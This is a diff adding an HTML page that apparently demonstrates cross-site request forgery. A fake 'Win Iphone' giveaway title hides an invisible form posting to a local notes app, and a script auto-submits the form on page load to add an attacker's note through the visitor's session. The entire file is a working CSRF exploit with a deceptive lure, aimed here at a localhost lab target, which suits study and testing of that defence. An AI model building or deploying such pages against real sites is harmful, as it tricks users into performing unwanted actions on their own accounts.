@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Win Iphone</title>
+    </head>
+    <body>
+        <h1>Win Iphone</h1>
+        <form id="evilForm"
+              action="http://127.0.0.1:8000/notes/add/"
+              method="POST"
+              style="display:none">
+            <input type="text" name="title" value="I was hacked!">
+            <input type="text"
+                   name="description"
+                   value="Attacker added this note using CSRF!">
+        </form>
+        <script>
+        // Auto-submit when page loads (invisible to user)
+        window.onload = function() {
+            document.getElementById('evilForm').submit();
+        };
+        </script>
+    </body>
+</html>
